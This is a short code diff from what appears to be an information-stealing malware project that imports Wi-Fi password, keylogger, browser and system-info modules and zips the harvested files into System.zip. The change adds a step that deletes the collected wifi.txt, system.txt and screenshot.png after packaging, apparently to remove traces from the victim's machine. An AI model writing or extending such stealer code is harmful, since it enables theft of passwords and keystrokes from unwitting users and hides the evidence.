@@ -1,4 +1,5 @@
 from modules.browser import run
+from modules.browser import delete_files
 from modules.info import start
 from modules.wifi import WifiPasswords
 from modules.keylogger import Keylogger
@@ -65,6 +66,7 @@ def zip(name, files):
         pass
     
 zip("System.zip", ["wifi.txt", "system.txt", "screenshot.png"])
+delete_files(["wifi.txt", "system.txt", "screenshot.png"])
 
 if keylogger == "True":
     try:
